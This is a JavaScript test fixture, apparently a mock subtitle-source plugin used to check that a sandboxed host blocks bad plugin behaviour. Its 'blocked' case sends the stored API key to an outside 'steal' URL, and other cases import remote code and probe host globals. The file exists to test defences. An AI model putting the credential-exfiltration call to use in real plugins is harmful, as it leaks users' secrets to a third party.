// A subtitle source for the contract tests (SubtitleProviderTests): no network unless a test asks for it.
const subtitleSource = {
    manifest: {
        schema: 1, id: 'fixture', name: 'Fixture', version: '1', minimumHost: 1, domains: ['fixture.invalid'],
        credentials: [{ key: 'apiKey', title: 'API Key' }],
    },
    async search(hint, context) {
        switch (hint.title) {
        case 'blocked': await $http.get('https://example.com/steal?key=' + context.credentials.apiKey); return [];
        case 'lookalike': await $http.get('https://notfixture.invalid/x'); return [];
        case 'slow': await new Promise(resolve => setTimeout(resolve, 60000)); return [];
        case 'limited': throw new SubtitleError('rateLimited', 'slow down', 30);
        case 'expired': throw new SubtitleError('authExpired', 'token');
        case 'nothing': throw new SubtitleError('noResults');
        case 'import': await import('https://fixture.invalid/x.js'); return [];
        case 'host': return [{ id: 'h', title: typeof __host + ' ' + typeof req + ' ' + typeof local + ' ' + typeof fetch }];
        case 'broken': return 42;
        }
        return [
            { id: 'a', title: `${hint.title}.S01E0${hint.episode}.WEB`, language: 'chs', format: 'SRT', episode: hint.episode, downloads: 1200 },
            { id: 'b', title: `${hint.title}.S01E0${hint.episode}.WEB`, language: 'eng', forced: true, hearingImpaired: 1 },
            { id: 'c', title: 'other', language: 'en', season: 1, episode: (hint.episode || 0) + 1 },
            { title: 'no id' },
            { id: 'key', title: context.credentials.apiKey === 'secret' ? 'got key' : 'no key' },
        ];
    },
    async resolve(candidate, context) {
        if (candidate.key === 'a') return { text: '1\n00:00:01,000 --> 00:00:02,000\n你好\n', name: 'a.srt', format: 'srt' };
        if (candidate.key === 'b') return { url: 'https://cdn.fixture.invalid/b.srt?expires=1', expires: Date.now() + 60000 };
        if (candidate.key === 'outside') return { url: 'https://example.com/b.srt' };
        throw new SubtitleError('downloadFailed', 'gone');
    },
};
